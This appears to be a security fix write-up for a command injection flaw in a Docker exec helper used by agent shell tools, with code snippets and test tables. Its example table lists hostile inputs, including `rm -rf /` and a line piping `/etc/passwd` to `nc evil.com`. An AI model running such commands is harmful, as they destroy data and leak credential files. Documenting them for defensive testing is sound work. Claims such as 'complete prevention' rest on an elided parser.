# Security Fix: Command Injection in Docker Exec Arguments (CWE-78)

## Issue Summary
Fixed a high-severity command injection vulnerability in the `buildDockerExecArgs` function where user-provided command strings were concatenated directly into shell commands without proper escaping.

## Vulnerability Details
- **Location**: `src/agents/bash-tools.shared.ts`, line ~154 (buildDockerExecArgs function)
- **Severity**: High
- **CWE**: CWE-78 (OS Command Injection)
- **Attack Vector**: Malicious command strings with shell metacharacters (`;`, `&&`, `||`, `|`, `$()`, backticks, etc.)
- **Impact**: Container escape and arbitrary command execution on the host system

### Original Vulnerable Code
```typescript
args.push(params.containerName, "sh", "-lc", `${pathExport}${params.command}`);
```

## Fix Implementation
Implemented a two-layer security approach:

1. **Command Parsing**: Parse the input command string into individual components (executable + arguments)
2. **Shell Escaping**: Escape each component using single-quote shell escaping to prevent metacharacter interpretation

### New Security Functions Added
```typescript
function escapeShellArg(arg: string): string {
  // Replace every single quote with '\'' (end quote, escaped quote, start quote)
  return "'" + arg.replace(/'/g, "'\\''") + "'";
}

function parseCommand(command: string): string[] {
  // Parse command into separate components handling quotes and escaping
  // ... implementation details ...
}
```

### Fixed Code
```typescript
// SECURITY FIX: Parse and escape the command to prevent injection
const commandParts = parseCommand(params.command);

if (commandParts.length === 0) {
  throw new Error('Invalid command: no executable found');
}

// Escape each part of the command separately to prevent injection
const escapedCommandParts = commandParts.map(escapeShellArg).join(' ');

args.push(params.containerName, "sh", "-lc", `${pathExport}${escapedCommandParts}`);
```

## Security Validation

### Malicious Input Examples (Now Safe)
| Input | Escaped Output | Security Status |
|-------|---------------|-----------------|
| `ls; rm -rf /` | `'ls' ';' 'rm' '-rf' '/'` | ✅ Safe - semicolon treated as literal |
| `echo $(whoami)` | `'echo' '$(whoami)'` | ✅ Safe - command substitution neutralized |
| `cat /etc/passwd \| nc evil.com 1234` | `'cat' '/etc/passwd' '|' 'nc' 'evil.com' '1234'` | ✅ Safe - pipe treated as literal |
| `echo hello && cat /etc/passwd` | `'echo' 'hello' '&&' 'cat' '/etc/passwd'` | ✅ Safe - logical operator neutralized |

### Legitimate Commands (Still Work)
| Input | Escaped Output | Functionality |
|-------|---------------|---------------|
| `ls -la` | `'ls' '-la'` | ✅ Works - command and args preserved |
| `echo "hello world"` | `'echo' 'hello world'` | ✅ Works - quoted strings handled |
| `git commit -m "fix bug"` | `'git' 'commit' '-m' 'fix bug'` | ✅ Works - complex args handled |

## Security Tradeoffs

### ✅ Security Benefits
- **Complete prevention** of command injection attacks
- **Maintains existing API** - no breaking changes to function signature  
- **Preserves basic functionality** - simple commands still work as expected
- **Robust escaping** - handles edge cases like embedded quotes correctly

### ⚠️ Functional Limitations
- **Shell features disabled** - pipes (`|`), redirects (`>`, `<`), command substitution (`$()`), etc. are treated as literal strings
- **Complex shell expressions** - Advanced shell scripting features won't work through this interface

### Rationale
This is an intentional security-first design decision. The fundamental principle is that **you cannot safely allow arbitrary shell syntax while preventing injection**. The fix prioritizes security over shell feature support.

## Test Coverage
Updated existing tests and added new security-focused test cases:

- ✅ Existing PATH handling tests updated for escaped output
- ✅ New test for command injection prevention  
- ✅ New test for single quote escaping
- ✅ New test for dangerous metacharacter handling
- ✅ Validation that shell operators are properly neutralized

## Code Style Compliance
- ✅ Follows existing TypeScript conventions
- ✅ Comprehensive JSDoc documentation
- ✅ Descriptive variable names and error messages
- ✅ Consistent with codebase patterns

## Recommendations for Complex Shell Operations
For users who need advanced shell features:
1. **Pre-validate shell scripts** at a higher application layer
2. **Use separate, trusted script files** instead of user-provided shell expressions
3. **Implement allowlist-based validation** for specific, known-safe shell operations
4. **Consider alternative APIs** that separate executable from arguments

## Summary
This fix successfully eliminates the command injection vulnerability while maintaining the existing API and preserving basic command execution functionality. The security-first approach ensures that malicious input cannot escape the intended command context, preventing potential container escape and host system compromise.